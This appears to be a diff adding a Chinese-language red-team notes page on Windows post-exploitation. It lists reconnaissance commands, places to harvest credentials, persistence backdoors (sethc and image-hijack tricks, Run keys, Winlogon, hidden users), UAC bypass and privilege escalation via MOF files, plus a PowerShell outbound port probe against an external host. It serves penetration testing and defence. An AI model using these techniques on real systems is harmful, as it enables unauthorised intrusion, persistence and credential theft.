+&lt;li&gt;&lt;code&gt;tasklist /svc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wmic process get caption,executablepath,commandline /format:csv&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;get-process&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;查看所有环境变量  &lt;code&gt;set&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看计划任务  &lt;code&gt;schtasks /QUERY /fo LIST /v&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看安装驱动  &lt;code&gt;DRIVERQUERY&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看操作系统信息
+&lt;ul&gt;
+&lt;li&gt;架构  &lt;code&gt;wmic os get osarchitecture&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;系统名  &lt;code&gt;wmic os get caption&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;查看逻辑盘  &lt;code&gt;wmic logicaldisk get caption&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看安装的软件信息  &lt;code&gt;wmic product get name,version&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看服务信息
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;wmic service list brief&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sc query&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Get-WmiObject win32_service | select PathName&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;域信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域信息&#34;&gt;#&lt;/a&gt; 域信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;获取当前组的计算机名  &lt;code&gt;net view&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;网络发现  &lt;code&gt;net view /all&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看所有域  &lt;code&gt;net view /domain&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;域森林、域树信息&lt;/li&gt;
+&lt;li&gt;域信任信息  &lt;code&gt;nltest /domain_trusts&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;定位域控  &lt;code&gt;net time /domain&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看域中的用户名  &lt;code&gt;dsquery user&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查询域组名称  &lt;code&gt;net group /domain&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查询域管理员  &lt;code&gt;net group &amp;quot;Domain Admins&amp;quot; /domain&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;域控信息
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nltest /dclist:xx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Get-NetDomain&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Get-NetDomainController&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;net group &amp;quot;Domain controllers&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;组策略&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;用户信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户信息&#34;&gt;#&lt;/a&gt; 用户信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;查看用户
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;net user&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;whoami&lt;/code&gt;  /  &lt;code&gt;whoami /priv&lt;/code&gt;  /  &lt;code&gt;whoami /all&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wmic useraccount get /ALL /format:csv&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;用户特权信息  &lt;code&gt;whoami /priv&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看当前权限  &lt;code&gt;net localgroup administrators&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看在线用户  &lt;code&gt;quser&lt;/code&gt;  /  &lt;code&gt;qwinsta&lt;/code&gt;  /  &lt;code&gt;query user&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域  &lt;code&gt;net config Workstation&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;ACL 信息  &lt;code&gt;get-acl&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;网络信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络信息&#34;&gt;#&lt;/a&gt; 网络信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;内网网段信息&lt;/li&gt;
+&lt;li&gt;网卡信息  &lt;code&gt;ipconfig&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;外网出口&lt;/li&gt;
+&lt;li&gt;ARP 表  &lt;code&gt;arp -a&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;路由表  &lt;code&gt;route print&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;监听的端口  &lt;code&gt;netstat -ano&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;连接的端口&lt;/li&gt;
+&lt;li&gt;端口信息
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-NetTCPConnection&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;hosts 文件&lt;/li&gt;
+&lt;li&gt;主备 DNS&lt;/li&gt;
+&lt;li&gt;DNS 缓存
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ipconfig /displaydns&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;探测出网情况
+&lt;ul&gt;
+&lt;li&gt;powershell -c &amp;quot;1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(&#39;allports.exposed&#39;,$_)) _ } 2&gt;null&amp;quot;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;防火墙&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防火墙&#34;&gt;#&lt;/a&gt; 防火墙&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;查看防火墙状态  &lt;code&gt;netsh advfirewall show allprofiles&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;防火墙日志目录  &lt;code&gt;netsh firewall show logging&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;防火墙规则  &lt;code&gt;netsh advfirewall firewall show rule name=all&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;netsh firewall show config&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;netsh firewall show state&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;密码信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码信息&#34;&gt;#&lt;/a&gt; 密码信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows RDP 连接记录&lt;/li&gt;
+&lt;li&gt;浏览器中保存的账号密码&lt;/li&gt;
+&lt;li&gt;系统密码管理器中的各种密码&lt;/li&gt;
+&lt;li&gt;无人值守安装文件中的密码信息
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;C:\sysprep.inf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:\sysprep\sysprep.xml&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:\Windows\Panther\Unattend\Unattended.xml&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:\Windows\Panther\Unattended.xml&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;票据信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#票据信息&#34;&gt;#&lt;/a&gt; 票据信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;cmdkey /l&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;klist&lt;/li&gt;
+&lt;li&gt;msf meterpreter&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;特殊文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊文件&#34;&gt;#&lt;/a&gt; 特殊文件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;文档
+&lt;ul&gt;
+&lt;li&gt;xlsx / xls&lt;/li&gt;
+&lt;li&gt;docx / doc&lt;/li&gt;
+&lt;li&gt;pptx / ppt&lt;/li&gt;
+&lt;li&gt;vsdx / vsd&lt;/li&gt;
+&lt;li&gt;md / txt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;压缩文件
+&lt;ul&gt;
+&lt;li&gt;zip / rar / 7z&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;VPN 配置
+&lt;ul&gt;
+&lt;li&gt;ovpn&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;代码
+&lt;ul&gt;
+&lt;li&gt;py / php / jsp / aspx / asp / sql&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;配置文件
+&lt;ul&gt;
+&lt;li&gt;conf / ini / xml&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;特定关键字
+&lt;ul&gt;
+&lt;li&gt;账号 / 账户 / 登录 /login/user&lt;/li&gt;
+&lt;li&gt;密码 /pass&lt;/li&gt;
+&lt;li&gt;代码 / 文档 / 交接 / 备份 /git/svn&lt;/li&gt;
+&lt;li&gt;邮箱 / 通讯录 / 集群 / 办公&lt;/li&gt;
+&lt;li&gt;代理 / 内网 / VPN&lt;/li&gt;
+&lt;li&gt;设备 / 资产&lt;/li&gt;
+&lt;li&gt;系统 / 运维 / 拓扑 / 网络 / IT&lt;/li&gt;
+&lt;li&gt;后台 / 管理员 / 数据库&lt;/li&gt;
+&lt;li&gt;监控 / 隔离 / 防火墙 / 网闸 / 巡检&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;局域网存活主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#局域网存活主机&#34;&gt;#&lt;/a&gt; 局域网存活主机&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;NetBIOS 扫描&lt;/li&gt;
+&lt;li&gt;OXID 扫描&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;启用的共享文件夹&lt;/li&gt;
+&lt;li&gt;回收站&lt;/li&gt;
+&lt;li&gt;最近运行的命令&lt;/li&gt;
+&lt;li&gt;访问文件历史记录&lt;/li&gt;
+&lt;li&gt;查看补丁安装情况
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;日志与事件信息
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;wevtutil&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;eventvwr&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;注册表信息
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;reg&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;安装的各类 agent 监控软件&lt;/li&gt;
+&lt;li&gt;安装的杀毒软件&lt;/li&gt;
+&lt;li&gt;查看 / 设置后缀关联
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;assoc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;assoc .ext=example&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;PowerShell 版本&lt;/li&gt;
+&lt;li&gt;.Net 版本&lt;/li&gt;
+&lt;li&gt;Wi-Fi 密码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
+&lt;h2 id=&#34;隐藏文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#隐藏文件&#34;&gt;#&lt;/a&gt; 隐藏文件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;创建系统隐藏文件
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;attrib +s +a +r +h filename&lt;/code&gt;  /  &lt;code&gt;attrib +s +h filename&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;利用 NTFS ADS (Alternate　Data　Streams) 创建隐藏文件&lt;/li&gt;
+&lt;li&gt;利用 Windows 保留字
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门&#34;&gt;#&lt;/a&gt; 后门&lt;/h2&gt;
+&lt;h3 id=&#34;sethc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sethc&#34;&gt;#&lt;/a&gt; sethc&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;sethc.exe&lt;/code&gt;  是 Windows 系统在用户按下五次 shift 后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换  &lt;code&gt;sethc.exe&lt;/code&gt;  的方式留下后门，在密码输入页面输入五次 shift 即可获得权限。&lt;/p&gt;
+&lt;h3 id=&#34;映像劫持&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#映像劫持&#34;&gt;#&lt;/a&gt; 映像劫持&lt;/h3&gt;
+&lt;p&gt;在高版本的 Windows 中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。&lt;/p&gt;
+&lt;p&gt;具体操作为在注册表的  &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option&lt;/code&gt;  下添加项  &lt;code&gt;sethc.exe&lt;/code&gt;  ，然后在  &lt;code&gt;sethc.exe&lt;/code&gt;  这个项中添加  &lt;code&gt;debugger&lt;/code&gt;  键，键值为恶意程序的路径。&lt;/p&gt;
+&lt;h3 id=&#34;定时任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定时任务&#34;&gt;#&lt;/a&gt; 定时任务&lt;/h3&gt;
+&lt;p&gt;Windows 下有  &lt;code&gt;schtasks&lt;/code&gt;  和  &lt;code&gt;at&lt;/code&gt;  两种计划任务机制。 其中  &lt;code&gt;at&lt;/code&gt;  在较高版本的 Windows 中已经弃用。&lt;/p&gt;
+&lt;p&gt;设置命令为  &lt;code&gt;schtasks /create /tn &amp;quot;TEST_OnLogon&amp;quot; /sc onlogon /tr &amp;quot;cmd.exe /c calc.exe&amp;quot;&lt;/code&gt;  、  &lt;code&gt;schtasks /create /tn &amp;quot;TEST_OnStartup&amp;quot; /sc onstart /ru system /tr &amp;quot;cmd.exe /c calc.exe&amp;quot;&lt;/code&gt;  。删除命令为  &lt;code&gt;schtasks /delete /tn &amp;quot;TEST_OnLogon&amp;quot; /f&lt;/code&gt;  。&lt;/p&gt;
+&lt;h3 id=&#34;登录脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登录脚本&#34;&gt;#&lt;/a&gt; 登录脚本&lt;/h3&gt;
+&lt;p&gt;Windows 可以在用户登录前执行脚本，使用  &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&lt;/code&gt;  设置。&lt;/p&gt;
+&lt;p&gt;也可在  &lt;code&gt;HKCU\Environment\&lt;/code&gt;  路径下设置  &lt;code&gt;UserInitMprLogonScript&lt;/code&gt;  来实现。&lt;/p&gt;
+&lt;h3 id=&#34;屏幕保护程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#屏幕保护程序&#34;&gt;#&lt;/a&gt; 屏幕保护程序&lt;/h3&gt;
+&lt;p&gt;Windows 可以自定义屏幕保护程序，使用  &lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop&lt;/code&gt;  设置。&lt;/p&gt;
+&lt;h3 id=&#34;隐藏用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#隐藏用户&#34;&gt;#&lt;/a&gt; 隐藏用户&lt;/h3&gt;
+&lt;p&gt;Windows 可以使用在用户名后加入  &lt;code&gt;$&lt;/code&gt;  来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。&lt;/p&gt;
+&lt;p&gt;在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。&lt;/p&gt;
+&lt;h3 id=&#34;clr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#clr&#34;&gt;#&lt;/a&gt; CLR&lt;/h3&gt;
+&lt;p&gt;CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET 产品构建的运行环境，可以粗略地理解为.NET 虚拟机。&lt;/p&gt;
+&lt;p&gt;.NET 程序的运行离不开 CLR，因此可以通过劫持 CLR 的方式实现后门。&lt;/p&gt;
+&lt;h3 id=&#34;winlogon-helper-dll后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#winlogon-helper-dll后门&#34;&gt;#&lt;/a&gt; Winlogon Helper DLL 后门&lt;/h3&gt;
+&lt;p&gt;Winlogon 是一个 Windows 组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在 Windows 登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。&lt;/p&gt;
+&lt;p&gt;注册表位置如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell&lt;/code&gt;  用于执行 exe 程序&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&lt;/code&gt;  用于执行 exe 程序&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify&lt;/code&gt;  用于执行 dll 文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自启动&#34;&gt;#&lt;/a&gt; 自启动&lt;/h2&gt;
+&lt;h3 id=&#34;基于注册表的自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于注册表的自启动&#34;&gt;#&lt;/a&gt; 基于注册表的自启动&lt;/h3&gt;
+&lt;p&gt;通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是  &lt;code&gt;Run&lt;/code&gt;  和  &lt;code&gt;RunOnce&lt;/code&gt;  ，其中 RunOnce 和 Run 区别在于 RunOnce 的键值只作用一次，执行完毕后会自动删除。&lt;/p&gt;
+&lt;p&gt;注册表如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;基于策略的自启动注册表设置如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;设置启动文件夹注册表位置如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;设置服务启动项注册表位置如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;用户自启动位置  &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&lt;/code&gt;  、  &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell&lt;/code&gt;  ，其中  &lt;code&gt;Userinit&lt;/code&gt;  键允许指定用逗号分隔的多个程序。&lt;/p&gt;
+&lt;p&gt;如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;基于特定目录的自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于特定目录的自启动&#34;&gt;#&lt;/a&gt; 基于特定目录的自启动&lt;/h3&gt;
+&lt;p&gt;自启动目录，  &lt;code&gt;C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt;  目录对特定用户生效，  &lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&lt;/code&gt;  对所有用户生效。在 NT6 以前，两个目录为  &lt;code&gt;C:\Documents and Settings\Username\Start Menu\Programs\StartUp&lt;/code&gt;  /  &lt;code&gt;C:\Documents and Settings\All Users\Start Menu\Programs\StartUp&lt;/code&gt;  。&lt;/p&gt;
+&lt;h1 id=&#34;权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限&#34;&gt;#&lt;/a&gt; 权限&lt;/h1&gt;
+&lt;h2 id=&#34;uac&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uac&#34;&gt;#&lt;/a&gt; UAC&lt;/h2&gt;
+&lt;h3 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
+&lt;p&gt;UAC (User Account Control) 是 Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。&lt;/p&gt;
+&lt;p&gt;当用户登陆 Windows 时，每个用户都会被授予一个 access token，这个 token 中有 security identifier (SID) 的信息，决定了用户的权限。&lt;/p&gt;
+&lt;h3 id=&#34;会触发uac的操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#会触发uac的操作&#34;&gt;#&lt;/a&gt; 会触发 UAC 的操作&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;以管理员权限启动应用&lt;/li&gt;
+&lt;li&gt;修改系统、UAC 设置&lt;/li&gt;
+&lt;li&gt;修改没有权限的文件或者目录（ % SystemRoot% / % ProgramFiles% 等 ）&lt;/li&gt;
+&lt;li&gt;修改 ACL (access control list)&lt;/li&gt;
+&lt;li&gt;安装驱动&lt;/li&gt;
+&lt;li&gt;增删账户，修改账户类型，激活来宾账户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; ByPass&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;DLL 相关&lt;/li&gt;
+&lt;li&gt;进程注入&lt;/li&gt;
+&lt;li&gt;注册表&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h2&gt;
+&lt;p&gt;权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的 UAF 或者其他类似的漏洞，以获得较高的权限。&lt;/p&gt;
+&lt;p&gt;逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。&lt;/p&gt;
+&lt;h3 id=&#34;任意写文件利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#任意写文件利用&#34;&gt;#&lt;/a&gt; 任意写文件利用&lt;/h3&gt;
+&lt;p&gt;在 Windows 中用户可以写的敏感位置主要有以下这些&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户自身的文件和目录，包括  &lt;code&gt;AppData&lt;/code&gt;   &lt;code&gt;Temp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:\&lt;/code&gt;  ，默认情况下用户可以写入&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:\ProgramData&lt;/code&gt;  的子目录，默认情况下用户可以创建文件夹、写入文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:\Windows\Temp&lt;/code&gt;  的子目录，默认情况下用户可以创建文件夹、写入文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;具体的 ACL 信息可用 AccessChk, 或者 PowerShell 的  &lt;code&gt;Get-Acl&lt;/code&gt;  命令查看。&lt;/p&gt;
+&lt;p&gt;可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的 dll，利用 dll 的加载执行来获取权限。&lt;/p&gt;
+&lt;h3 id=&#34;mof&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mof&#34;&gt;#&lt;/a&gt; MOF&lt;/h3&gt;
+&lt;p&gt;MOF 是 Windows 系统的一个文件（  &lt;code&gt;c:/windows/system32/wbem/mof/nullevt.mof&lt;/code&gt;  ）叫做 &amp;quot;托管对象格式&amp;quot;，其作用是每隔五秒就会去监控进程创建和死亡。&lt;/p&gt;
+&lt;p&gt;当拥有文件上传的权限但是没有 Shell 时，可以上传定制的 mof 文件至相应的位置，一定时间后这个 mof 就会被执行。&lt;/p&gt;
+&lt;p&gt;一般会采用在 mof 中加入一段添加管理员用户的命令的 vbs 脚本，当执行后就拥有了新的管理员账户。&lt;/p&gt;
